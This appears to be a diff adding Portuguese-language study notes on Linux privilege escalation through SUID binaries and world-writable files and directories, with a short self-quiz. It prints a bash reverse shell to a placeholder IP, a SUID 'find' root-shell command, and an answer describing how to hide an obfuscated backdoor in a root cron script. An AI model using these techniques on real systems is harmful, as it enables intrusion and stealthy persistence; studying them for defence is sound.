@@ -177,3 +177,127 @@ Você pode fazer:
 → **root shell**
 
 ---
+
+## Diretórios world-writable
+
+Significa que qualquer usuário pode escrever / prover arquivos lá.
+
+Agora pense, se você pode escrever dentro de um diretório que um usuário privilegiado utiliza, podemos colocar arquivos maliciosos lá.
+
+Para encontrar tais diretórios, podemos usar o find com o type -d e -perm de -0002
+
+`find / -type d -perm -0002 2>/dev/null`
+
+O binário  do world-writable é `0002`
+
+
+
+**Arquivos executáveis world-writable**
+
+Esses, são ainda melhores que os diretórios, pois, você pode:
+
+- substituir o arquivo
+
+- injetar comandos maliciosos
+
+- manipular  comportamento do sistema
+
+- sequestrar scripts usados em cronjobs ou serviços
+
+Por exemplo: 
+
+`-rwxrwxrwx 1 root root /usr/local/bin/backup.sh`
+
+Se isso existe, você pode colar um reverse shell e espera o root rodar com o cron -> root shell pra você.
+
+
+
+**Para encontrar esses arquivos executáveis world-writable:**
+
+`find / -perm -0002 -type f 2>/dev/null`
+
+---
+
+## Observações
+
+Agora, com todos esses meios de achar possíveis vulnerabilidades em sistemas Linux, vamos entender mais o que podemos fazer com cada uma delas.
+
+
+
+### Achou um SUID -> tenta exploit
+
+Exemplo:
+
+- find
+
+- nano
+
+- vim
+
+- bash
+
+- python
+
+- perl
+
+- cp
+
+- chmod
+
+- rsync
+
+- less
+
+- more
+
+Cada um dos acima tem métodos de conseguir reverse shell com SUID no GTFOBins
+
+
+
+### Achou diretório world-writable -> tenta takeover
+
+Colocar scripts maliciosos, binários falsos ou arquivo que root executará por engano.
+
+
+
+### Achou arquivo world-writable -> modifica
+
+Aqui, você pode fazer um reverse shell com
+
+`bash -i >& /dev/tcp/SEU_IP/4444 0>&1`
+
+E espera a execução por um cron, serviço ou usuário privilegiado.
+
+
+
+# MINI-EXERCÍCIO
+
+Sem pular:
+
+1. **Explique com suas palavras o que o bit SUID realmente faz.**
+   
+   Resposta: Um arquivo com SUID ativado executa **com o UID do proprietário**, não do usuário que rodou.  
+   Assim, se `/usr/bin/find` tem SUID e pertence ao root, qualquer usuário que executá-lo terá o processo rodando **como root (UID 0)**.
+
+2. **Me diga por que um binário “find” com SUID é tão perigoso.**
+   
+   Um `find` SUID é perigoso porque ele permite executar comandos através do parâmetro `-exec`.  
+   Se o binário roda como root, você pode abusar de `-exec` para abrir um shell root, por exemplo:
+   
+   `find . -exec /bin/sh \; -quit`
+   
+   Portanto, `find` SUID = **root shell imediato**.
+
+3. **Por que um diretório world-writable não é necessariamente perigoso, mas um arquivo world-writable é?**
+   
+   Um diretório world-writable permite apenas **criar, apagar e renomear arquivos**, mas não permite modificar o conteúdo de arquivos protegidos.  
+   Ele só é perigoso se algum serviço/cron/root **usar** esse diretório.
+   
+   Um arquivo world-writable é imediatamente perigoso, porque você pode **alterar seu conteúdo**, e se esse arquivo for executado por root (cronjob, serviço, script), você insere um payload e ganha root no próximo ciclo de execução.
+
+4. **Se você achar `/usr/local/sbin/update.sh` world-writable, o que você faria como atacante?**
+   
+   Resposta: Eu manteria a função original do script (para não quebrar a rotina e não gerar alertas), adicionaria um payload discreto — como um reverse shell, backdoor ou comando de persistência — e ofuscaria o conteúdo para evitar detecção.  
+   Antes de modificar, eu confirmaria **quem executa**, **quando** e **como**, considerando OPSEC e pivoting interno.
+
+
